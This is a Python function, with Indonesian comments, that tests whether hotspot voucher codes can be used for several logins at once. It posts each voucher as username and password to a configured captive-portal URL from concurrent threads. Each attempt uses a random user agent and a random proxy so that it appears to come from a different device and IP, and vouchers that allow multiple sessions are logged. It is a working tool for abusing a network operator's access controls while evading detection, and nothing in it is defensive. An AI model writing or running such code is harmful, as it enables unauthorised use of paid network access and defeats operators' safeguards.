import requests
import threading
import random
from user_agents import generate_user_agent
import config


def test_multi_login(voucher, test_count=2, prefix="default"):
    """
    Tes apakah voucher bisa multi-login.
    Simulasi beda device: session baru, user-agent acak, proxy acak (jika ada).
    """
    success_count = 0
    lock = threading.Lock()

    def attempt(proxy=None):
        nonlocal success_count
        session = requests.Session()

        payload = {
            "username": voucher,
            "password": voucher,
            "dst": "",
            "popup": "true"
        }
        headers = {"User-Agent": generate_user_agent()}  # beda device = beda UA

        try:
            r = session.post(
                config.TARGET_URL,
                data=payload,
                headers=headers,
                proxies=proxy,
                timeout=config.TIMEOUT
            )
            if "status" in r.text.lower() or "logout" in r.text.lower():
                with lock:
                    success_count += 1
        except Exception as e:
            print(f"[!] Multi login error: {e}")

    threads = []
    for _ in range(test_count):
        # pilih proxy acak kalau ada, biar seolah2 beda IP/device
        proxy = None
        if config.working_proxies:
            proxy = random.choice(config.working_proxies)

        t = threading.Thread(target=attempt, args=(proxy,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if success_count > 1:
        print(f"[++] Voucher {voucher} bisa multi-login! ({success_count} sesi)")
        with open(f"success_multi_{prefix}.log", "a") as f:
            f.write(voucher + "\n")
    else:
        print(f"[--] Voucher {voucher} single user.")
        with open(f"failed_multi_{prefix}.log", "a") as f:
            f.write(voucher + "\n")